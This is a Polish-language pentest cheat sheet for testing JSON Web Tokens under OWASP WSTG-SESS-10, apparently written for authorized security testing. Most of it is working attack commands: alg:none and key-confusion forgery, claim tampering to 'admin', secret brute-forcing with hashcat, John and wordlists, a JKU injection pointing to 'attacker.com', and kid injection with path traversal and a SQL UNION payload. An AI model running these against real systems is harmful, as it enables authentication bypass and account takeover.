# WSTG-SESS-10 — Testing JSON Web Tokens (JWT)

## Cele

- Okreslenie czy JWT ujawnia wrazliwe informacje
- Testowanie manipulacji i falszyowania tokenow JWT
- Sprawdzenie podatnosci na znane ataki (alg:none, key confusion, brute force)

## KOMENDY

### Dekodowanie JWT (trzy czesci base64)

```bash
echo "JWT_TOKEN_HERE" | cut -d'.' -f1 | base64 -d 2>/dev/null; echo
echo "JWT_TOKEN_HERE" | cut -d'.' -f2 | base64 -d 2>/dev/null; echo

```

### jwt_tool - kompleksowe testowanie JWT

```bash
# Dekodowanie
python3 jwt_tool.py JWT_TOKEN_HERE

# Test alg:none (brak podpisu)
python3 jwt_tool.py JWT_TOKEN_HERE -X a

# Test key confusion RS256 -> HS256
python3 jwt_tool.py JWT_TOKEN_HERE -X k -pk public.pem

# Brute force secret
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/SecLists-master/Passwords/scraped-JWT-secrets.txt

# Manipulacja claimow
python3 jwt_tool.py JWT_TOKEN_HERE -T
python3 jwt_tool.py JWT_TOKEN_HERE -I -pc role -pv admin
python3 jwt_tool.py JWT_TOKEN_HERE -I -pc sub -pv admin

# Test wszystkich znanych atakow
python3 jwt_tool.py JWT_TOKEN_HERE -M at -t TARGET/api/protected -rh "Authorization: Bearer FFF"

```

### jwt-cracker - brute force klucza JWT

```bash
jwt-cracker "JWT_TOKEN_HERE" "abcdefghijklmnopqrstuvwxyz0123456789" 6

```

### Hashcat do lamania JWT secret

```bash
# Tryb 16500 dla JWT (HS256/HS384/HS512)
hashcat -a 0 -m 16500 JWT_TOKEN_HERE Desktop/WSTG/SecLists-master/Passwords/scraped-JWT-secrets.txt

```

### John the Ripper

```bash
echo "JWT_TOKEN_HERE" > jwt_hash.txt
john jwt_hash.txt --wordlist=Desktop/WSTG/SecLists-master/Passwords/scraped-JWT-secrets.txt --format=HMAC-SHA256

```

### Test wygasniecia tokenu (exp claim)

```bash
# Dekoduj i sprawdz pole "exp"
echo "JWT_TOKEN_HERE" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('Exp:', d.get('exp')); import datetime; print('Date:', datetime.datetime.fromtimestamp(d['exp']))"

```

### Test uzycia tokenu po wygasnieciu

```bash
curl -s -H "Authorization: Bearer EXPIRED_JWT_TOKEN" TARGET/api/protected -o /dev/null -w "%{http_code}"

```

### Test JKU/JWK header injection

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -X s -ju "https://attacker.com/jwks.json"

```

### Test kid injection

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py JWT_TOKEN_HERE -I -hc kid -hv "' UNION SELECT 'secret' -- " -S hs256 -p "secret"

```

### Sprawdzenie czy token jest w cookie czy w header

```bash
curl -v TARGET/api/protected 2>&1 | grep -iE "authorization|bearer|jwt"

```

### Test czy serwer akceptuje token bez podpisu

```bash
# Usun trzecia czesc JWT (podpis) i wyslij
HEADER=$(echo "JWT_TOKEN_HERE" | cut -d'.' -f1)
PAYLOAD=$(echo "JWT_TOKEN_HERE" | cut -d'.' -f2)
curl -s -H "Authorization: Bearer ${HEADER}.${PAYLOAD}." TARGET/api/protected -o /dev/null -w "%{http_code}"

```

## KOMENDY Z WORDLISTAMI

### SecLists - scraped JWT secrets do brute force

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/SecLists-master/Passwords/scraped-JWT-secrets.txt

```

### SecLists - common passwords do brute force JWT

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt

```

### SecLists - top passwords

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt

```

### Bug-Bounty-Wordlists - JWT secrets

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/Bug-Bounty-Wordlists-main/jwt-secrets.txt

```

### Hashcat z roznymi wordlistami

```bash
hashcat -a 0 -m 16500 JWT_TOKEN_HERE Desktop/WSTG/SecLists-master/Passwords/darkc0de.txt
hashcat -a 0 -m 16500 JWT_TOKEN_HERE Desktop/WSTG/Bug-Bounty-Wordlists-main/jwt-secrets.txt

```

### PayloadsAllTheThings - materialy JWT

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/JSON Web Token/README.md
# Zawiera opisy technik ataku na JWT

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Przechwyc JWT z Burp Proxy (naglowek Authorization: Bearer lub cookie)
2. Uzyj jwt.io do dekodowania i analizy struktury tokenu
3. Sprawdz algorytm (alg) w naglowku - RS256, HS256, none?
4. Sprawdz claimy: sub, role, exp, iat, iss, aud
5. Sprawdz czy token zawiera wrazliwe dane (hasla, PII)
6. Przetestuj zmiane claimow w Burp Repeater
7. Sprawdz czy token jest odnawiany (refresh token flow)
8. Przetestuj uzycie wygaslego tokenu
9. Zainstaluj rozszerzenie Burp "JSON Web Tokens" do automatycznej analizy

